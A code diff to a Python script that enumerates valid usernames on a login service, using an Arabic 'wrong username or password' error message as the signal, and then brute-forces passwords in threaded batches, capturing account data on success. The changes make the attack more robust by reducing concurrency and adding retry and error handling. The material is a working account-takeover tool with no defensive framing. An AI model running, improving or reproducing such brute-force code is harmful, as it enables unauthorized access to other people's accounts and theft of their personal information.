@@ -98,10 +98,21 @@ def generate_valid_usernames(prefix="20", count=1000, existing_usernames=None):
     usernames = [f"{prefix}{random.randint(100000, 999999)}" for _ in range(usernames_to_test)]
     payloads = [{"username": u} for u in usernames]
 
-    with ThreadPoolExecutor(max_workers=50) as executor:
-        futures = [executor.submit(send_request, payload) for payload in payloads]
+    with ThreadPoolExecutor(max_workers=20) as executor:
+        futures = []
+        for payload in payloads:
+            try:
+                futures.append(executor.submit(send_request, payload))
+            except RuntimeError as e:
+                print(f"Thread creation error: {e}")
+                time.sleep(1)  # Wait before retrying
+                
         for future in tqdm(as_completed(futures), total=len(futures), desc="Validating"):
-            result, payload = future.result()
+            try:
+                result, payload = future.result()
+            except Exception as e:
+                print(f"Request error: {e}")
+                continue
             if result.get("message") == "خطأ في إسم المستخدم أو كلمة المرور":
                 valid_usernames.append(payload["username"])
 
@@ -130,10 +141,21 @@ def try_passwords_for_users(valid_usernames):
                 payloads = [{"username": username, "password": p} for p in batch]
 
                 success = None
-                with ThreadPoolExecutor(max_workers=20) as executor:
-                    futures = [executor.submit(send_request, payload) for payload in payloads]
+                with ThreadPoolExecutor(max_workers=10) as executor:
+                    futures = []
+                    for payload in payloads:
+                        try:
+                            futures.append(executor.submit(send_request, payload))
+                        except RuntimeError as e:
+                            print(f"Thread creation error: {e}")
+                            time.sleep(1)  # Wait before retrying
+                            
                     for future in tqdm(as_completed(futures), total=len(futures), desc=f"Trying {username}"):
-                        result, payload = future.result()
+                        try:
+                            result, payload = future.result()
+                        except Exception as e:
+                            print(f"Request error: {e}")
+                            continue
 
                         if result.get("status") is True and result.get("code") == 200:
                             info = result.get("data", {})
